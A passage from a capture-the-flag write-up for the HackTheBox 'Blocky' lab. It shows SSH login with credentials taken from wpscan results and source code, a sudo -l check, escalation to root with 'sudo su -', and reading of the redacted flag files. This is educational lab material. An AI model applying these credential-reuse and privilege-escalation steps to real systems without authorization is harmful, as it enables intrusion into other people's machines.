+</pre> </div> </div> <p><br> Use the username from the wpscan results and the password from the source code to ssh into the machine.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4514"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4514')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4514')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4514')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4514')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4514">
+┌──(kali㉿kali)-[~/Documents/htb/blocky]
+└─$ ssh notch@10.10.10.37 
+notch@10.10.10.37's password: 
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+7 packages can be updated.
+7 updates are security updates.
+
+
+Last login: Fri Jul  8 07:16:08 2022 from 10.10.14.29
+-bash: cannot create temp file for here-document: No space left on device
+notch@Blocky:~$
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4514" onclick="terminalOverlayClose('bash-bash-4514')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4514')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4514')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4514')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4514" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/blocky]
+└─$ ssh notch@10.10.10.37 
+notch@10.10.10.37's password: 
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+7 packages can be updated.
+7 updates are security updates.
+
+
+Last login: Fri Jul  8 07:16:08 2022 from 10.10.14.29
+-bash: cannot create temp file for here-document: No space left on device
+notch@Blocky:~$
+</pre> </div> </div> <p><br> Run sudo -l to get a list of all the commands that notch can use with sudo.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4292"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4292')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4292')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4292')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4292')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4292">
+notch@Blocky:~$ sudo -l
+[sudo] password for notch: 
+Matching Defaults entries for notch on Blocky:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User notch may run the following commands on Blocky:
+    (ALL : ALL) ALL
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4292" onclick="terminalOverlayClose('bash-bash-4292')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4292')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4292')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4292')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4292" data-language="bash">
+notch@Blocky:~$ sudo -l
+[sudo] password for notch: 
+Matching Defaults entries for notch on Blocky:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User notch may run the following commands on Blocky:
+    (ALL : ALL) ALL
+</pre> </div> </div> <p><br> Use sudo su - to change to the root user.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-443"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-443')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-443')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-443')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-443')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-443">
+notch@Blocky:~$ sudo su -
+root@Blocky:~# 
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-443" onclick="terminalOverlayClose('bash-bash-443')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-443')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-443')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-443')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-443" data-language="bash">
+notch@Blocky:~$ sudo su -
+root@Blocky:~# 
+</pre> </div> </div> <p><br> Get the user.txt flag.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41051"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41051')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41051')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41051')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41051')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41051">
+root@Blocky:~# cat /home/notch/user.txt
+&lt;redacted&gt;
+root@Blocky:~# ifconfig
+ens160    Link encap:Ethernet  HWaddr 00:50:56:b9:57:a5  
+          inet addr:10.10.10.37  Bcast:10.10.10.255  Mask:255.255.255.0
+          inet6 addr: fe80::250:56ff:feb9:57a5/64 Scope:Link
+          inet6 addr: dead:beef::250:56ff:feb9:57a5/64 Scope:Global
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:5350339 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:5091855 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:887094307 (887.0 MB)  TX bytes:2474663025 (2.4 GB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:29780 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:29780 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:2368968 (2.3 MB)  TX bytes:2368968 (2.3 MB)
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41051" onclick="terminalOverlayClose('bash-bash-41051')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41051')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41051')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41051')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41051" data-language="bash">
+root@Blocky:~# cat /home/notch/user.txt
+&lt;redacted&gt;
+root@Blocky:~# ifconfig
+ens160    Link encap:Ethernet  HWaddr 00:50:56:b9:57:a5  
+          inet addr:10.10.10.37  Bcast:10.10.10.255  Mask:255.255.255.0
+          inet6 addr: fe80::250:56ff:feb9:57a5/64 Scope:Link
+          inet6 addr: dead:beef::250:56ff:feb9:57a5/64 Scope:Global
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:5350339 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:5091855 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:887094307 (887.0 MB)  TX bytes:2474663025 (2.4 GB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:29780 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:29780 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:2368968 (2.3 MB)  TX bytes:2368968 (2.3 MB)
+</pre> </div> </div> <p><br> Get the root.txt flag.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41045"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41045')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41045')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41045')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41045')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41045">
+root@Blocky:~# cat /root/root.txt
+&lt;redacted&gt;
+root@Blocky:~# ifconfig
+ens160    Link encap:Ethernet  HWaddr 00:50:56:b9:57:a5  
+          inet addr:10.10.10.37  Bcast:10.10.10.255  Mask:255.255.255.0
+          inet6 addr: fe80::250:56ff:feb9:57a5/64 Scope:Link
+          inet6 addr: dead:beef::250:56ff:feb9:57a5/64 Scope:Global
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:5440287 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:5181158 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:903090767 (903.0 MB)  TX bytes:2521630482 (2.5 GB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:30180 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:30180 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:2400568 (2.4 MB)  TX bytes:2400568 (2.4 MB)
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41045" onclick="terminalOverlayClose('bash-bash-41045')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41045')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41045')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41045')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41045" data-language="bash">
+root@Blocky:~# cat /root/root.txt
+&lt;redacted&gt;
+root@Blocky:~# ifconfig
+ens160    Link encap:Ethernet  HWaddr 00:50:56:b9:57:a5  
+          inet addr:10.10.10.37  Bcast:10.10.10.255  Mask:255.255.255.0
+          inet6 addr: fe80::250:56ff:feb9:57a5/64 Scope:Link
+          inet6 addr: dead:beef::250:56ff:feb9:57a5/64 Scope:Global
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:5440287 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:5181158 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:903090767 (903.0 MB)  TX bytes:2521630482 (2.5 GB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:30180 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:30180 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:2400568 (2.4 MB)  TX bytes:2400568 (2.4 MB)
+</pre> </div> </div> <p><br> And with that, we conquered the Blocky ender dragon. See you in the next one.</p> </article> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> © Copyright 2026 Biscotti Diskette  ·  <a href="https://github.com/biscottidiskette" target="_blank" rel="external nofollow noopener">GitHub</a>  ·  <a href="https://app.hackthebox.eu/profile/biscottidiskette" target="_blank" rel="external nofollow noopener">HackTheBox</a>  ·  <a href="https://tryhackme.com/r/p/BiscottiDiskette" target="_blank" rel="external nofollow noopener">TryHackMe</a>  ·  <a href="/contact/">Contact</a> </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-HL7MJBJN7X"></script> <script defer src="/assets/js/google-analytics-setup.js?1c5d3b199be7049d4732e15d2072d0b2"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> <script src="/assets/js/terminal.js?ec2a38fba85ea4751db97d30059cd1c5"></script> </body> </html>
